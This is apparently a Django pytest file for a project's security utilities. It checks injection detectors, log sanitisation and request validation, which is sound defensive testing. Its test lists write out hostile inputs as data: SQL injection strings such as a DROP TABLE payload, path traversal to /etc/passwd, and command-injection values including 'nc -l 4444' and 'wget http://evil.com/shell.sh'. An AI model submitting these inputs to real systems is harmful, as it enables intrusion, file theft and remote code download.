"""
Tests for the shared security utilities.
"""

import pytest
from unittest.mock import Mock, patch
from django.test import TestCase, RequestFactory
from django.http import HttpRequest

from project.security.utils import (
    SecurityPatterns,
    SecurityValidator,
    SecurityLogger,
    RequestSecurityUtils
)


class TestSecurityPatterns(TestCase):
    """Test security pattern definitions."""
    
    def test_patterns_exist(self):
        """Test that all pattern categories are defined."""
        patterns = SecurityPatterns.get_all_patterns()
        
        expected_categories = [
            'xsl_injection',
            'sql_injection', 
            'path_traversal',
            'command_injection'
        ]
        
        for category in expected_categories:
            assert category in patterns
            assert len(patterns[category]) > 0
    
    def test_xsl_patterns(self):
        """Test that XSL injection patterns are comprehensive."""
        patterns = SecurityPatterns.XSL_INJECTION_PATTERNS
        
        # Should include key XSL-related patterns
        pattern_strings = ' '.join(patterns)
        assert 'xml' in pattern_strings.lower()
        assert 'xsl' in pattern_strings.lower()
        assert 'script' in pattern_strings.lower()
        assert 'DOCTYPE' in pattern_strings


class TestSecurityValidator(TestCase):
    """Test security validation functions."""
    
    def test_xsl_injection_detection(self):
        """Test XSL injection pattern detection."""
        # Test cases that should be detected
        malicious_inputs = [
            '<?xml version="1.0"?>',
            '<xsl:template>',
            '<!DOCTYPE html>',
            'SYSTEM "evil.dtd"',
            'PUBLIC "-//W3C//DTD"',
            '<!ENTITY evil>',
            'data:text/xml,<xml>',
            'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"',
            '<![CDATA[malicious]]>',
            '<script>alert(1)</script>',
            '</script>',
        ]
        
        for malicious_input in malicious_inputs:
            result = SecurityValidator.contains_xsl_injection_pattern(malicious_input)
            assert result is True, f"Failed to detect XSL injection in: {malicious_input}"
    
    def test_xsl_injection_safe_inputs(self):
        """Test that safe inputs are not flagged."""
        safe_inputs = [
            'normal text',
            'user@example.com',
            'https://example.com/path?param=value',
            'Some regular content with numbers 123',
            'HTML content without dangerous tags',
            ''
        ]
        
        for safe_input in safe_inputs:
            result = SecurityValidator.contains_xsl_injection_pattern(safe_input)
            assert result is False, f"False positive for safe input: {safe_input}"
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        malicious_inputs = [
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--",
            "' OR '1'='1",
            "1' AND '1'='1",
            "EXEC xp_cmdshell('dir')",
            "0x414141414141"
        ]
        
        for malicious_input in malicious_inputs:
            result = SecurityValidator.contains_sql_injection_pattern(malicious_input)
            assert result is True, f"Failed to detect SQL injection in: {malicious_input}"
    
    def test_path_traversal_detection(self):
        """Test path traversal pattern detection."""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f",
            "%2e%2e%5c",
            "/proc/self/environ"
        ]
        
        for malicious_input in malicious_inputs:
            result = SecurityValidator.contains_path_traversal_pattern(malicious_input)
            assert result is True, f"Failed to detect path traversal in: {malicious_input}"
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection."""
        malicious_inputs = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            "`whoami`",
            "$(id)",
            "nc -l 4444",
            "wget http://evil.com/shell.sh"
        ]
        
        for malicious_input in malicious_inputs:
            result = SecurityValidator.contains_command_injection_pattern(malicious_input)
            assert result is True, f"Failed to detect command injection in: {malicious_input}"
    
    def test_multiple_pattern_detection(self):
        """Test detection across multiple categories."""
        test_input = "<?xml version='1.0'?><xsl:template>'; DROP TABLE users;--</xsl:template>"
        
        results = SecurityValidator.contains_any_suspicious_pattern(test_input)
        
        assert results['xsl_injection'] is True
        assert results['sql_injection'] is True
    
    def test_non_string_inputs(self):
        """Test that non-string inputs are handled properly."""
        test_inputs = [None, 123, [], {}, True]
        
        for test_input in test_inputs:
            result = SecurityValidator.contains_xsl_injection_pattern(test_input)
            assert result is False
    
    def test_sanitize_log_value(self):
        """Test log value sanitization."""
        test_cases = [
            ("password=secret123&user=admin", "password=***&user=admin"),
            ("user@example.com", "[EMAIL]"),
            ("192.168.1.1", "[IP]"),
            ("token=abc123&key=xyz789", "token=***&key=***"),
            ("a" * 200, "a" * 100 + "...")
        ]
        
        for input_val, expected_pattern in test_cases:
            result = SecurityValidator.sanitize_log_value(input_val)
            if expected_pattern.endswith("..."):
                assert result.endswith("...")
                assert len(result) <= 103  # 100 + "..."
            else:
                assert expected_pattern in result or result == expected_pattern


class TestRequestSecurityUtils(TestCase):
    """Test request security utilities."""
    
    def setUp(self):
        self.factory = RequestFactory()
    
    def test_get_client_ip_x_forwarded_for(self):
        """Test IP extraction from X-Forwarded-For header."""
        request = self.factory.get('/')
        request.META['HTTP_X_FORWARDED_FOR'] = '192.168.1.100, 10.0.0.1, 172.16.0.1'
        
        ip = RequestSecurityUtils.get_client_ip(request)
        assert ip == '192.168.1.100'
    
    def test_get_client_ip_remote_addr(self):
        """Test IP extraction from REMOTE_ADDR."""
        request = self.factory.get('/')
        request.META['REMOTE_ADDR'] = '192.168.1.100'
        
        ip = RequestSecurityUtils.get_client_ip(request)
        assert ip == '192.168.1.100'
    
    def test_validate_request_parameters_safe(self):
        """Test validation of safe request parameters."""
        request = self.factory.get('/?user=admin&page=1')
        
        error = RequestSecurityUtils.validate_request_parameters(request)
        assert error is None
    
    def test_validate_request_parameters_malicious(self):
        """Test validation detects malicious parameters."""
        request = self.factory.get('/?param=<?xml version="1.0"?>')
        
        error = RequestSecurityUtils.validate_request_parameters(request)
        assert error is not None
        assert 'Invalid request parameters' in error
    
    def test_validate_request_parameters_post(self):
        """Test validation of POST parameters."""
        request = self.factory.post('/', {'data': '<xsl:template>'})
        
        error = RequestSecurityUtils.validate_request_parameters(request)
        assert error is not None
        assert 'Invalid request parameters' in error
    
    def test_validate_auth_request_safe(self):
        """Test auth request validation with safe data."""
        request = self.factory.get('/accounts/microsoft/login/')
        
        error = RequestSecurityUtils.validate_auth_request(request)
        assert error is None
    
    def test_validate_auth_request_malicious_path(self):
        """Test auth request validation detects malicious path."""
        request = self.factory.get('/accounts/microsoft/<?xml version="1.0"?>')
        
        error = RequestSecurityUtils.validate_auth_request(request)
        assert error is not None
        assert 'Invalid request path' in error
    
    def test_validate_auth_request_malicious_params(self):
        """Test auth request validation detects malicious parameters."""
        request = self.factory.get('/accounts/microsoft/login/?state=<xsl:template>')
        
        error = RequestSecurityUtils.validate_auth_request(request)
        assert error is not None


class TestSecurityLogger(TestCase):
    """Test security logging utilities."""
    
    @patch('project.security.utils.logger')
    def test_log_security_event(self, mock_logger):
        """Test security event logging."""
        SecurityLogger.log_security_event(
            event_type='TEST_EVENT',
            details='Test security event',
            request_info={'path': '/test', 'ip': '192.168.1.1'},
            severity='WARNING'
        )
        
        mock_logger.log.assert_called_once()
        args = mock_logger.log.call_args[0]
        assert args[0] == 30  # WARNING level
        assert 'SECURITY_EVENT: TEST_EVENT' in args[1]
    
    @patch('project.security.utils.logger')
    def test_log_blocked_request(self, mock_logger):
        """Test blocked request logging."""
        SecurityLogger.log_blocked_request(
            attack_type='XSL_INJECTION',
            value='<?xml version="1.0"?>',
            request_path='/test',
            user_ip='192.168.1.1'
        )
        
        mock_logger.log.assert_called_once()
        args = mock_logger.log.call_args[0]
        assert 'XSL_INJECTION_BLOCKED' in args[1]


class TestSecurityIntegration(TestCase):
    """Integration tests for security utilities."""
    
    def test_middleware_compatibility(self):
        """Test that utilities work with middleware patterns."""
        from project.security.utils import RequestSecurityUtils
        
        factory = RequestFactory()
        request = factory.get('/accounts/microsoft/login/?state=normal_state')
        
        # Should pass validation
        error = RequestSecurityUtils.validate_auth_request(request)
        assert error is None
        
        # Should detect malicious content
        request = factory.get('/accounts/microsoft/login/?state=<?xml>')
        error = RequestSecurityUtils.validate_auth_request(request)
        assert error is not None
    
    def test_adapter_compatibility(self):
        """Test that utilities work with adapter patterns."""
        from project.security.utils import RequestSecurityUtils
        
        factory = RequestFactory()
        request = factory.get('/?code=auth_code&state=normal_state')
        
        # Should pass validation
        error = RequestSecurityUtils.validate_request_parameters(
            request, ['xsl_injection'], True, False
        )
        assert error is None
    
    def test_pattern_extensibility(self):
        """Test that patterns can be extended or customized."""
        # Test that we can add new patterns if needed
        original_patterns = SecurityPatterns.XSL_INJECTION_PATTERNS.copy()
        
        # Should be able to access and potentially extend patterns
        assert len(original_patterns) > 0
        assert isinstance(original_patterns, list)
        
        # Test that pattern categories are well-defined
        all_patterns = SecurityPatterns.get_all_patterns()
        assert len(all_patterns) >= 4  # At least the 4 main categories